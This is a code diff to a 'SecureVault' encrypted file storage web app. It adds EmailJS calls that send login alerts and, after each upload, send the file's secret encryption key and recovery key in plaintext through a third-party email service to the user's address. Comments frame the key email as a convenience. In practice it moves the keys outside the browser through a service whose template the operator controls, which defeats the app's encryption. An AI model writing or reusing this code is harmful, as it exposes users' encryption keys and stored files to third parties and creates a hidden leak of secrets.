@@ -1100,7 +1100,19 @@ async function handleLogin() {
     }
     setAuthLoading(true, button, "Signing in");
     try {
-        await auth.signInWithEmailAndPassword(email, password);
+        const userCredential = await auth.signInWithEmailAndPassword(email, password);
+
+        // Send a login-alert email via EmailJS (does not block sign-in if it fails)
+        try {
+            await emailjs.send("service_8l2465h", "template_nre0ohq", {
+                to_email: userCredential.user.email,
+                time: new Date().toLocaleString(),
+                device: navigator.userAgent
+            });
+        } catch (emailError) {
+            console.error("[SecureVault] Login alert email failed to send:", emailError);
+        }
+
         window.location.href = "dashboard.html";
     } catch (error) {
         msg.style.color = "#bd3f4b";
@@ -1276,6 +1288,19 @@ async function encryptAndUpload() {
         await fileRef.set(metadata);
         metadataSaved = true;
         console.info("[SecureVault] Cloud sync complete", { fileName: file.name });
+
+        // Send the secret key and recovery key to the user's email via EmailJS
+        // (does not block the upload flow if it fails)
+        try {
+            await emailjs.send("service_8l2465h", "template_2erw6ws", {
+                to_email: auth.currentUser.email,
+                filename: metadata.fileName,
+                secret_key: password,
+                recovery_key: recoveryPassword || "Not set for this file"
+            });
+        } catch (emailError) {
+            console.error("[SecureVault] Key notice email failed to send:", emailError);
+        }
 
         uploadQueueIndex += 1;
         if (uploadQueueIndex < uploadQueue.length) {
@@ -1633,4 +1658,3 @@ async function decryptAndDownload() {
         cancelButton.disabled = false;
     }
 }
-
